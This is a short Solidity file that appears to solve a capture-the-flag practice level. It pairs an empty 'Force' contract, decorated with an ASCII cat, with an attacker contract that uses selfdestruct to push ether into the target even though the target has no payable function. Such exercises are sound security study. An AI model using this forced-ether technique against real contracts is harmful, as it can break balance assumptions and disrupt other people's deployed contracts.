// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract breakForce {

    Force private immutable target;

    constructor(address _target) {
        target = Force(payable(_target));
    }

    function breakit() external payable {
        require(msg.value > 0);
        address payable force = payable(address(target));
        selfdestruct(force);
    }
}